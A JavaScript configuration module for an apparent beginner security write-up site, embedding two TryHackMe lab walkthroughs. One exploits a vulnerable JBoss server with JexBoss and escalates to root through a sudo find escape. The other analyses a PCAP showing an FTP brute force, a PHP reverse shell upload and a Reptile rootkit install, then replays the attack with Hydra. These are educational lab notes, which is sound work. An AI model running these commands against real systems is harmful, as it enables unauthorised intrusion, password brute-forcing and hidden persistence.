function getHomepageDefaults() {
  return {
    heroEyebrow: "Security Writeups",
    heroTitle: "<strong>Welcome, fellow hackers and cybersecurity enthusiasts!<br />This is a place for absolute beginners to learn, grow, and become hacking wizards through TryHackMe and Hack The Box write-ups.</strong>",
    heroLede: "",
    heroImageSrc: "assets/typing-meme.gif",
    heroImageAlt: "Typing meme on laptop",
    heroEmbedUrl: "",
    heroMediaPosition: "right",
    heroPrimaryText: "CyberSecurity",
    heroPrimaryHref: "cybersecurity.html",
    heroSecondaryText: "Hacking",
    heroSecondaryHref: "hacking.html",
    heroPillPrimary: "Latest",
    heroPillSecondary: "Field notes",
    heroCardTitle: "Writeups built for review",
    heroCardBody: "Each walkthrough focuses on clean recon notes, repeatable commands, and lessons worth keeping.",
    aboutHeading: "What you will find",
    aboutIntro: "Each post sticks to a repeatable workflow: recon, foothold, privilege escalation, and takeaways.",
    aboutCard1Title: "Recon snapshots",
    aboutCard1Body: "Clean notes on scans, enumeration, and decision points.",
    aboutCard2Title: "Tooling notes",
    aboutCard2Body: "Commands that matter, plus the flags I forget if I do not write them down.",
    aboutCard3Title: "Lessons learned",
    aboutCard3Body: "What went wrong, how it was fixed, and what I will do next time.",
    recentHeading: "Two separate tracks",
    recentIntro: "CyberSecurity and Hacking now live on separate pages so the site stays divided cleanly.",
    recentCard1Title: "CyberSecurity",
    recentCard1Body: "Security notes, broader thinking, and selected material with a wider operational view.",
    recentCard1LinkText: "Open CyberSecurity",
    recentCard1LinkHref: "cybersecurity.html",
    recentCard2Title: "Hacking",
    recentCard2Body: "Hands-on research, labs, exploit paths, and offensive workflow notes all live on their own page.",
    recentCard2LinkText: "Open Hacking",
    recentCard2LinkHref: "hacking.html",
    contactTitle: "Need to ship a post fast?",
    contactBody: "Draft locally, tighten the writeup, and publish when you are ready.",
    contactButtonText: "Browse research",
    contactButtonHref: "hacking.html",
    footerText: "Yoinked by Yoinkas | Security writeups",
    sectionOrder: ["hero", "about", "recent", "contact"],
    aboutCardOrder: ["about-card-1", "about-card-2", "about-card-3"],
    recentCardOrder: ["recent-card-1", "recent-card-2"],
    featuredWriteups: [
      {
        id: "featured-tony-the-tiger",
        title: "Tony the Tiger",
        imageSrc: "assets/tonythetiger.png",
        imageAlt: "Tony the Tiger",
        buttonText: "Open Notion",
        buttonHref: "https://www.notion.so/Tony-the-Tiger-302ca0ef4e7a80569f3cc79b9ef23682?source=copy_link",
        notes: `## Tony the Tiger - TryHackMe Write-Up

## Overview
Tony the Tiger is a beginner-friendly Linux challenge focused on Java deserialization attacks and exploitation of a vulnerable JBoss application server.

The goal of the room is to perform reconnaissance on the target machine, identify exposed services, exploit the vulnerable JBoss application, gain shell access, escalate privileges, and retrieve the root flag.

## Enumeration
The first step when attacking a machine is enumeration. I started with an Nmap scan:

```
nmap -sC -sV -T4 <TARGET-IP>
```

This revealed several open ports, with the most interesting service running on port 8080.

```
22/tcp    SSH
80/tcp    HTTP
8080/tcp  JBoss / Tomcat
```

## Web Enumeration
Navigating to port 8080 revealed a Tony the Tiger themed blog page. An image on the page looked suspicious, so I downloaded it and inspected it with:

```
strings image.jpg
```

This exposed the first flag:

```
THM{Tony_Sure_Loves_Frosted_Flakes}
```

## Researching the Vulnerability
After identifying JBoss, I researched common JBoss exploits. JBoss servers are known to suffer from Java deserialization issues that can lead to remote code execution.

## Exploiting JBoss
To exploit the target, I used JexBoss.

```
git clone https://github.com/joaomatosf/jexboss.git
cd jexboss
pip install -r requires.txt
python jexboss.py -host http://TARGET-IP:8080
```

Once exploitation succeeded, JexBoss deployed a payload and provided shell access.

## Gaining a Shell
After landing the shell, I used basic commands to confirm access and inspect the environment:

```
whoami
pwd
ls
```

## SSH Access
Further enumeration revealed credentials that allowed SSH login as the jboss user.

```
ssh jboss@TARGET-IP
```

## Privilege Escalation
Checking sudo permissions showed that /usr/bin/find could be run as root.

```
sudo -l
sudo /usr/bin/find . -exec /bin/sh \\; -quit
```

This spawned a root shell.

## Root Access
After gaining root, I navigated to the root directory and retrieved the final flag.

```
cd /root
ls
```

## Key Lessons Learned
This room reinforced several important concepts: careful enumeration, hidden data inside files, Java deserialization exploitation, and privilege escalation through unsafe sudo permissions.`,
      },
      {
        id: "featured-gallery",
        title: "Gallery",
        imageSrc: "assets/gallery.png",
        imageAlt: "Gallery room graphic",
        buttonText: "Open Write-Up",
        buttonHref: "https://www.notion.so/Gallery-324ca0ef4e7a80c1944fc624197091ef?source=copy_link",
        notes: "",
      },
      {
        id: "featured-h4cked",
        title: "h4cked",
        imageSrc: "assets/h4cked.png",
        imageAlt: "h4cked room graphic",
        buttonText: "Open Notion",
        buttonHref: "https://www.notion.so/h4cked-322ca0ef4e7a80bdbed5f284e46e6bd3?source=copy_link",
        notes: `## h4cked - TryHackMe Write-Up

## Objective
Analyze the provided PCAP, understand how the attacker compromised the target, and replicate the attack path in a clean pentesting workflow.

## PCAP Analysis
The first step was opening the PCAP in Wireshark and reviewing the captured traffic. Repeated authentication attempts against FTP from the same source pointed to a brute-force attack.

The traffic showed multiple login attempts using the USER FTP command, which made the attack pattern clear.

## Attack Tool
The password-guessing behavior matched Hydra, a common brute-force tool created by Van Hauser and often used against FTP, SSH, SMB, RDP, and HTTP services.

## Username Enumeration
The attacker repeatedly targeted the FTP account:

```
jenny
```

## Credential Discovery
A successful FTP login exposed the credentials below:

```
Username: jenny
Password: password123
```

## FTP Session Activity
After login, the session moved into the Apache web root:

```
/var/www/html
```

Further commands showed a malicious upload with PASV, STOR, and CHMOD.

## Backdoor Upload
The uploaded file was:

```
shell.php
```

The reverse shell source referenced the standard PentestMonkey PHP reverse shell:

```
http://pentestmonkey.net/tools/php-reverse-shell
```

## Reverse Shell Access
Once the shell connected back, the attacker verified execution with:

```
whoami
```

The returned user was www-data, and the compromised host was identified as wir3.

## Shell Upgrade
To stabilize the session, the attacker upgraded the shell to a TTY:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation
Privilege escalation was performed with:

```
sudo su
```

This provided root access on the target.

## Persistence
After root access, the attacker cloned the Reptile project from GitHub:

```
git clone https://github.com/f0rb1dd3n/Reptile.git
```

Reptile is a kernel rootkit used to maintain stealthy persistence on the system.

## Attack Replication
To recreate the compromise, the target was scanned with:

```
nmap -sC -sV -vv -A -p- 10.64.167.149
```

The scan identified the following services:

```
21/tcp  FTP     vsftpd
22/tcp  SSH     OpenSSH
80/tcp  HTTP    Apache
```

## Web Enumeration
Directory enumeration with tools like dirsearch or gobuster revealed several paths returning 403 Forbidden, confirming restricted content worth further investigation.

## Credential Reuse
With the username already known from the PCAP, Hydra was used against FTP:

```
hydra -l jenny -P /usr/share/wordlists/rockyou.txt 10.64.167.149 ftp
```

After recovering the password, FTP access was used to upload a modified PHP reverse shell into the web root and trigger code execution through the web server.

## Final Compromise
The full chain was: reverse shell, TTY upgrade, privilege escalation, root access, and rootkit installation for persistence.

## Key Lessons
This room highlights how unencrypted traffic can expose credentials, commands, malware sources, and the complete attack chain. It also reinforces the importance of network forensics, credential hygiene, and persistence detection.`,
      },
    ],
    hiddenSections: [],
    customSections: [],
  };
}

module.exports = {
  getHomepageDefaults,
};
